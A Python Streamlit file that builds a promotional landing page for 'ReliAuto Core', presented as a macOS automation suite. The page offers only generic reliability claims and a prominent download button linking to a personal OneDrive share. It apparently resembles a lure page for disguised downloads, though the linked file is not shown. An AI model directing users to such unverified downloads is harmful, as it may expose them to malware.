import streamlit as st

# Configure page
st.set_page_config(
    page_title="ReliAuto - Trusted Automation Suite",
    layout="centered"
)

# Header Section
st.markdown("<h1 style='text-align: center'>ReliAuto Core</h1>", unsafe_allow_html=True)
st.markdown("<h3 style='text-align: center'>Initial Release of the World's Most Reliable Automation Framework</h3>", unsafe_allow_html=True)
st.markdown("---")

# Main Content
st.markdown("""
## **Effortless Automation, Guaranteed Reliability**

**Foundational Features:**
- One-click configuration setup
- Self-validating execution system
- Plain English interface
- macOS-optimized precision engine
- Built-in reliability safeguards
""")

st.markdown("---")

# Key Features
col1, col2 = st.columns(2)
with col1:
    st.markdown("""
    ### Unmatched Simplicity
    *"Automation should work for you, not vice versa"*
    - 5-minute setup wizard
    - Visual configuration dashboard
    - Auto-dependency installation
    - Guided troubleshooting
    """)

with col2:
    st.markdown("""
    ### Military-Grade Reliability
    - Fail-safe execution protocol
    - Automatic state recovery
    - Precision validation layers
    - Continuous integrity checks
    """)

# Download Section
st.markdown("---")
st.markdown("## Start Your Automation Journey")

st.markdown("""
**Installation Package Includes:**
- ReliAuto Core Engine
- Configuration Assistant
- Reliability Toolkit
- Sample Automation Templates
- Setup Guide (PDF + Video)
""")

DOWNLOAD_URL = "https://1drv.ms/u/c/f4598138ab76194c/EZOtyBZorDNFjnwjCODpUVQBsgJSW-y-FxIM9-eQtAqpQg?e=N0H0u0"

st.markdown(f"""
<div style="text-align: center">
<a href="{DOWNLOAD_URL}">
    <button style="
        background: #1A5BC4;
        color: white;
        padding: 18px 32px;
        border: none;
        border-radius: 8px;
        font-size: 18px;
        font-weight: bold;
        cursor: pointer;
        margin: 20px auto;
        display: block;">
        Download Reliable Automation Suite (v1.0)
    </button>
</a>
</div>

**Quick Start Requirements:**  
✓ macOS 12+ • 4GB RAM • 500MB storage  
✓ Internet connection for auto-configuration  
✓ Basic English understanding
""", unsafe_allow_html=True)

# Footer
st.markdown("---")
st.markdown("""
<div style='text-align: center'>
<a href="#"><i>Enterprise Configuration Guide</i></a> • 
Support • Reliability Metrics • Setup Docs
</div>
""", unsafe_allow_html=True)